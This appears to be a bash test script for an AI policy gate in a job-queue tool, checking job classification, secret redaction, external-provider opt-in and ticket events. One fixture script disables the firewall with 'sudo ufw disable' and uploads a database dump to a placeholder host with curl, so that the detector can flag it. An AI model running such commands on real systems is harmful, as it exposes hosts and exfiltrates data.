#!/usr/bin/env bash
set -euo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
qgate() { timeout -k 2 "${QUEUEBASH_AI_POLICY_GATE_COMMAND_TIMEOUT:-10}" "$ROOT/bin/queue-ai-policy-gate" "$@"; }
mkdir -p "$TMP/root/pending" "$TMP/root/pol_blocked" "$TMP/root/logs"
cat > "$TMP/root/pending/job1.job" <<'JOB'
JOB_ID=job1
JOB_NAME=ordinary
JOB_CLASS=DEFAULT
PRIORITY=100
RUNNER=auto
SANDBOX_LEVEL=off
COMMAND=( echo hello )
JOB

# Disabled by default unless explicitly enabled/forced.
if QUEUEBASH_ROOT="$TMP/root" qgate scan --limit 1 >/tmp/ai-policy-disabled.out 2>/tmp/ai-policy-disabled.err; then
  echo "expected disabled scan to fail" >&2
  exit 1
fi
grep -q "disabled" /tmp/ai-policy-disabled.err
echo "stage: disabled-default ok"

# Weak/unsupported block requests must not become policy blocks.
QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_ROOT="$TMP/root" \
  qgate scan --limit 1 \
  --fixture-decision-json "$ROOT/tests/fixtures/ai_policy_gate/weak_block_downgrade_decision.json" \
  > "$TMP/delay.json"
python3 - "$TMP/delay.json" <<'PY'
import json, sys
obj=json.load(open(sys.argv[1]))
assert obj["schema"] == "queuebash.ai_policy_gate.result.v1"
assert obj["results"][0]["action"] == "advise_delay"
PY
grep -q '^AI_POLICY_GATE_ADVISORY=' "$TMP/root/pending/job1.job"
grep -q '^NOT_BEFORE_EPOCH=' "$TMP/root/pending/job1.job"
[[ ! -f "$TMP/root/pol_blocked/job1.job" ]]
echo "stage: advisory-downgrade ok"

# A high-confidence but non-hostile ambiguous admin classification is still advisory only.
QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_ROOT="$TMP/root" \
  qgate classify --job-file "$TMP/root/pending/job1.job" \
  --fixture-decision-json "$ROOT/tests/fixtures/ai_policy_gate/ambiguous_admin_block_decision.json" \
  > "$TMP/ambiguous.json"
python3 - "$TMP/ambiguous.json" <<'PY'
import json, sys
obj=json.load(open(sys.argv[1]))
assert obj["decision"] == "advise_delay", obj
PY

# A low-confidence unknown block request is allowed, not delayed or blocked.
QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_ROOT="$TMP/root" \
  qgate classify --job-file "$TMP/root/pending/job1.job" \
  --fixture-decision-json "$ROOT/tests/fixtures/ai_policy_gate/low_confidence_unknown_decision.json" \
  > "$TMP/lowconf.json"
python3 - "$TMP/lowconf.json" <<'PY'
import json, sys
obj=json.load(open(sys.argv[1]))
assert obj["decision"] == "allow", obj
PY

# Per-job fixture directory avoids applying one hostile fixture to every job.
cat > "$TMP/root/pending/job2.job" <<'JOB'
JOB_ID=job2
JOB_NAME=hostile
JOB_CLASS=DEFAULT
PRIORITY=100
RUNNER=auto
SANDBOX_LEVEL=off
COMMAND=( bash -lc 'echo hostile fixture' )
JOB
QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_ROOT="$TMP/root" \
  qgate scan --limit 2 \
  --fixture-decision-dir "$ROOT/tests/fixtures/ai_policy_gate/per_job" \
  > "$TMP/block.json"
[[ -f "$TMP/root/pol_blocked/job2.job" ]]
[[ -f "$TMP/root/pending/job1.job" ]]
grep -q '^POLICY_BLOCKED_BY=ai_policy_gate' "$TMP/root/pol_blocked/job2.job"
grep -q '"action":"pol_block"' "$TMP/root/logs/ai-policy-gate.audit.jsonl"

# Prompt/request generation redacts obvious inline secrets before model use.
cat > "$TMP/root/pending/job3.job" <<'JOB'
JOB_ID=job3
JOB_NAME=secret-redaction
JOB_CLASS=DEFAULT
PRIORITY=100
RUNNER=auto
SANDBOX_LEVEL=off
COMMAND=( curl -H 'Authorization: Bearer abcdefghijklmnopqrstuvwxyz' --password supersecret123 https://example.invalid )
JOB
QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_ROOT="$TMP/root" \
  qgate classify --job-file "$TMP/root/pending/job3.job" \
  --fixture-decision-json "$ROOT/tests/fixtures/ai_policy_gate/allow_decision.json" \
  --request-json "$TMP/request.json" >/dev/null
! grep -q 'abcdefghijklmnopqrstuvwxyz' "$TMP/request.json"
! grep -q 'supersecret123' "$TMP/request.json"
grep -q '\[REDACTED' "$TMP/request.json"
echo "stage: redaction ok"


# Priority-aware job-id lookup and referenced local script examination.
LOOKUP_ROOT="$TMP/lookup-root"
mkdir -p "$LOOKUP_ROOT/pending/p0999999990" "$LOOKUP_ROOT/logs" "$TMP/submit-dir"
cat > "$TMP/submit-dir/badscript.sh" <<'BADSCRIPT'
#!/usr/bin/env bash
sudo ufw disable
curl -T dump.sql https://example.invalid/upload
BADSCRIPT
cat > "$LOOKUP_ROOT/pending/p0999999990/20260604_124509_1780573509339211_030946_2799640.job" <<JOB
JOB_ID=20260604_124509_1780573509339211_030946_2799640
JOB_NAME=badjob
JOB_CLASS=DEFAULT
PRIORITY=10
RUNNER=auto
SANDBOX_LEVEL=off
PWD_AT_SUBMIT=$TMP/submit-dir
COMMAND=( bash badscript.sh )
JOB
QUEUEBASH_ROOT="$LOOKUP_ROOT" qgate examine --job-id badjob > "$TMP/jobid_exam.json"
python3 - "$TMP/jobid_exam.json" <<'PYJOBID'
import json, sys
obj=json.load(open(sys.argv[1]))
plan=obj['job_type_plan']; summary=obj['pattern_summary']
assert 'referenced_script_file' in plan.get('payload_sources', []), plan
assert summary['firewall_weakened'] is True, summary
assert summary['data_transfer_after_firewall_weakened'] is True, summary
assert summary['compound_exposure_pattern'] is True, summary
assert obj['executed'] is False and obj['external_network'] is False, obj
PYJOBID
QUEUEBASH_ROOT="$LOOKUP_ROOT" qgate classify --job-id 20260604_124509_1780573509339211_030946_2799640 \
  --fixture-decision-json "$ROOT/tests/fixtures/ai_policy_gate/allow_decision.json" \
  > "$TMP/jobid_decision.json"
python3 - "$TMP/jobid_decision.json" <<'PYJOBDEC'
import json, sys
obj=json.load(open(sys.argv[1]))
assert obj['decision'] == 'advise_delay', obj
assert obj['category'] == 'compound_exposure_pattern', obj
PYJOBDEC
echo "stage: priority-job-id-script-examination ok"

# Gemini is explicit test-provider only; without opt-in it must fail before calling out.
if QUEUEBASH_ROOT="$LOOKUP_ROOT" QUEUEBASH_AI_POLICY_GATE_PROVIDER=gemini \
   qgate classify --job-id badjob >/tmp/ai-policy-gemini.out 2>/tmp/ai-policy-gemini.err; then
  echo "expected Gemini provider to require explicit external-provider opt-in" >&2
  exit 1
fi
grep -q 'external_provider_requires_QUEUEBASH_AI_POLICY_GATE_ALLOW_EXTERNAL_PROVIDER=1' /tmp/ai-policy-gemini.err
echo "stage: gemini-explicit-opt-in ok"

# Live mode must refuse non-loopback Ollama URLs before any network call.
if QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_AI_POLICY_GATE_OLLAMA_URL='http://192.0.2.10:11434/api/generate' \
   QUEUEBASH_ROOT="$TMP/root" qgate classify --job-file "$TMP/root/pending/job3.job" \
   >/tmp/ai-policy-nonlocal.out 2>/tmp/ai-policy-nonlocal.err; then
  echo "expected non-loopback live endpoint to be refused" >&2
  exit 1
fi
grep -q 'refusing_non_loopback_ollama_url' /tmp/ai-policy-nonlocal.err
echo "stage: nonlocal-refusal ok"


# ITSM/ticket contract integration: warn-delay can request a ticket when explicitly enabled.
rm -f "$TMP/root/logs/itsm-events.jsonl"
QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_ITSM_ENABLED=1 \
QUEUEBASH_ITSM_EVENTS='policy_blocked,advisory_high_risk_operation' \
QUEUEBASH_AI_POLICY_GATE_TICKET_ON_ADVISE_DELAY=1 QUEUEBASH_ROOT="$TMP/root" \
  qgate scan --limit 1 \
  --fixture-decision-json "$ROOT/tests/fixtures/ai_policy_gate/weak_block_downgrade_decision.json" \
  > "$TMP/itsm_delay.json"
python3 - "$TMP/root/logs/itsm-events.jsonl" "$TMP/itsm_delay.json" <<'PYDELAY'
import json, sys
lines=[json.loads(x) for x in open(sys.argv[1]) if x.strip()]
assert len(lines) == 1, lines
e=lines[0]
assert e["schema"] == "queuebash.reporter.itsm_event.v1"
assert e["event"] == "advisory_high_risk_operation"
assert e["ticket_requested"] is True
assert e["ticket_created"] is False
assert e["contract_only"] is True
assert "command_text" not in e
res=json.load(open(sys.argv[2]))
assert res["results"][0]["ticket_requested"] is True
assert res["results"][0]["ticket_event"] == "advisory_high_risk_operation"
PYDELAY
echo "stage: advisory-ticket ok"

# ITSM/ticket contract integration: pol_block requests a ticket by default when ITSM is enabled.
ITSM_ROOT="$TMP/itsm-root"
mkdir -p "$ITSM_ROOT/pending" "$ITSM_ROOT/pol_blocked" "$ITSM_ROOT/logs"
cat > "$ITSM_ROOT/pending/job4.job" <<'JOB'
JOB_ID=job4
JOB_NAME=ticketed-pol-block
JOB_CLASS=DEFAULT
PRIORITY=100
RUNNER=auto
SANDBOX_LEVEL=off
COMMAND=( bash -lc 'echo hostile ticket fixture' )
JOB
cat > "$ITSM_ROOT/pending/job5.job" <<'JOB'
JOB_ID=job5
JOB_NAME=ticketed-allow
JOB_CLASS=DEFAULT
PRIORITY=100
RUNNER=auto
SANDBOX_LEVEL=off
COMMAND=( echo allow )
JOB
mkdir -p "$TMP/itsm-fixtures"
cp "$ROOT/tests/fixtures/ai_policy_gate/pol_block_decision.json" "$TMP/itsm-fixtures/job4.json"
cp "$ROOT/tests/fixtures/ai_policy_gate/allow_decision.json" "$TMP/itsm-fixtures/job5.json"
QUEUEBASH_AI_POLICY_GATE_ENABLED=1 QUEUEBASH_ITSM_ENABLED=1 \
QUEUEBASH_ITSM_EVENTS='policy_blocked,advisory_high_risk_operation' \
QUEUEBASH_ROOT="$ITSM_ROOT" \
  qgate scan --limit 2 \
  --fixture-decision-dir "$TMP/itsm-fixtures" \
  > "$TMP/itsm_block.json"
python3 - "$ITSM_ROOT/logs/itsm-events.jsonl" "$TMP/itsm_block.json" <<'PYBLOCK'
import json, sys
lines=[json.loads(x) for x in open(sys.argv[1]) if x.strip()]
assert any(e["event"] == "policy_blocked" and e["ticket_requested"] is True and e["ticket_created"] is False for e in lines), lines
assert all("command_text" not in e for e in lines)
res=json.load(open(sys.argv[2]))
assert any(r.get("ticket_event") == "policy_blocked" for r in res["results"]), res
PYBLOCK
echo "stage: policy-block-ticket ok"

echo "ai_policy_gate_fixture_core: ok"
